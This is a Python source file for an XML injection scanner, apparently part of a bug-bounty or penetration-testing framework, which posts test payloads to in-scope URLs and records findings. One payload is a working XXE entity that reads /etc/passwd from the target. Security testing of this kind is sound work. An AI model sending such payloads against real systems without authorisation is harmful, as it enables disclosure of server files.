"""XML injection testing tool."""

from __future__ import annotations

import aiohttp
from lib_webbh.scope import ScopeManager
from workers.input_validation.base_tool import InputValidationTool
from workers.input_validation.concurrency import WeightClass


class XmlInjectionTester(InputValidationTool):
    """Test for XML injection vulnerabilities."""

    name = "xml_injection_tester"
    weight_class = WeightClass.LIGHT

    async def execute(
        self,
        target,
        scope_manager: ScopeManager,
        target_id: int,
        container_name: str,
        headers: dict | None = None,
        **kwargs,
    ) -> dict:
        """Execute XML injection tests against target URLs."""
        found = 0
        vulnerable = 0

        urls = await self._get_all_url_assets(target_id)
        payloads = ["<test>", "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"]

        for asset_id, url in urls:
            for payload in payloads:
                try:
                    data = {"xml": payload}
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, data=data, headers=headers, timeout=10) as resp:
                            response_text = await resp.text()
                            if "root:" in response_text or "xxe" in response_text.lower():
                                await self._save_vulnerability(
                                    target_id=target_id,
                                    asset_id=asset_id,
                                    severity="high",
                                    title="XML Injection Vulnerability",
                                    description=f"XML injection found at {url}",
                                    poc=url,
                                )
                                vulnerable += 1
                                break
                except Exception:
                    continue
            found += 1

        return {"found": found, "vulnerable": vulnerable}